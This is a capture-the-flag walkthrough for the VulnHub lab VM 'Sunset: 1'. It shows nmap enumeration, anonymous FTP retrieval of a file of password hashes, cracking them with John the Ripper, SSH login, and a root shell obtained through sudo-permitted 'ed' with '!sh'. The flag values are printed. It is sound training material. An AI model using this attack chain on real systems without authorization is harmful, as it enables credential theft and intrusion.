# Sunset: 1

- **Machine:** Sunset: 1
- **Download:** https://www.vulnhub.com/entry/sunset-1,339/

![](822-1.png)

---

# Machine Setup

1. Extract the downloaded archive.
2. Import the **OVA** file into VirtualBox.
3. Click **Finish**.
4. Start the virtual machine.

---

# Network Scanning

## Discover the Target IP

Identify the target machine on the local network.

```bash
nmap -sn 192.168.2.0/24
```

![](822-2.png)

---

## Full Nmap Scan

Perform a complete scan to enumerate open ports, running services, operating system information, and default NSE script results.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.115
```

![](822-3.png)

---

## Optional Enumeration

Scan every TCP port.

```bash
nmap -v -p- 192.168.2.115
```

Run a standard service and version detection scan.

```bash
nmap -sC -sV -A 192.168.2.115
```

---

# FTP Enumeration

Anonymous FTP access is available.

Connect to the FTP server.

```bash
ftp 192.168.2.115
```

---

## List Available Files

```bash
ls
```

Download the backup file.

```bash
get backup
```

![](822-4.png)

---

## Inspect the Backup File

Display its contents.

```bash
cat backup
```

![](822-5.png)

The backup contains several SHA-512 password hashes.

```text
office:$6$$9ZYTy.VI0M7cG9tVcPl.QZZi2XHOUZ9hLsiCr/avWTajSPHqws7.75I9ZjP4HwLN3Gvio5To4gjBdeDGzhq.X.
datacenter:$6$$3QW/J4OlV3naFDbhuksxRXLrkR6iKo4gh.Zx1RfZC2OINKMiJ/6Ffyl33OFtBvCI7S4N1b8vlDylF2hG2N0NN/
sky:$6$$Ny8IwgIPYq5pHGZqyIXmoVRRmWydH7u2JbaTo.H2kNG7hFtR.pZb94.HjeTK1MLyBxw8PUeyzJszcwfH0qepG0
sunset:$6$406THujdibTNu./R$NzquK0QRsbAUUSrHcpR2QrrlU3fA/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/
space:$6$$4NccGQWPfiyfGKHgyhJBgiadOlP/FM4.Qwl1yIWP28ABx.YuOsiRaiKKU.4A1HKs9XLXtq8qFuC3W6SCE4Ltx/
```

---

# Password Cracking

Save the hashes.

```bash
nano hash.txt
```

![](822-6.png)

Crack the password hashes with John the Ripper.

```bash
john --wordlist=/opt/rockyou.txt hash.txt
```

![](822-7.png)

One of the recovered passwords belongs to the **sunset** user.

---

# SSH Access

Authenticate using the recovered credentials.

```bash
ssh sunset@192.168.2.115
```

![](822-8.png)

---

## User Enumeration

List the files.

```bash
ls
```

Read the user flag.

```bash
cat user.txt
```

![](822-9.png)

Recovered user flag:

```text
5b5b8e9b01ef27a1cc0a2d5fa87d7190
```

---

# Privilege Escalation

## Check Sudo Privileges

Enumerate sudo permissions.

```bash
sudo -l
```

The user is allowed to execute **ed** with elevated privileges.

---

## Launch ed

```bash
sudo ed
```

Spawn a root shell from within the editor.

```bash
!sh
```

Verify root access.

```bash
id
```

A root shell is successfully obtained.

---

## Read the Root Flag

Navigate to the root directory.

```bash
cd /root
```

List the files.

```bash
ls
```

Display the root flag.

```bash
cat flag.txt
```

Recovered root flag:

```text
25d7ce0ee3cbf71efbac61f85d0c14fe
```

![](822-10.png)

---

# Vulnerability Summary

| No. | Vulnerability | Impact |
|-----|---------------|--------|
| 1 | Anonymous FTP access | Disclosure of sensitive backup files |
| 2 | Password hashes stored in accessible backup | Credential recovery |
| 3 | Weak user password | SSH compromise |
| 4 | Misconfigured sudo permissions (`ed`) | Local privilege escalation to root |

---

# Key Learning

- Anonymous FTP shares should never expose sensitive backup files.
- Password hashes should not be stored in publicly accessible locations.
- Weak passwords are easily recovered using dictionary attacks.
- Always enumerate sudo privileges after obtaining shell access.
- GTFOBins is an excellent resource for identifying privilege escalation techniques using permitted binaries such as `ed`.

---

# Summary

The assessment began by enumerating the target services, revealing an anonymous FTP server. A backup file downloaded from the FTP share contained multiple SHA-512 password hashes, which were successfully cracked using John the Ripper. The recovered credentials provided SSH access as the **sunset** user, allowing retrieval of the user flag. Enumeration of sudo privileges showed that the user could execute the **ed** editor as root without restrictions. By spawning a shell from within `ed`, root privileges were obtained, enabling access to the root directory and successful retrieval of the final flag.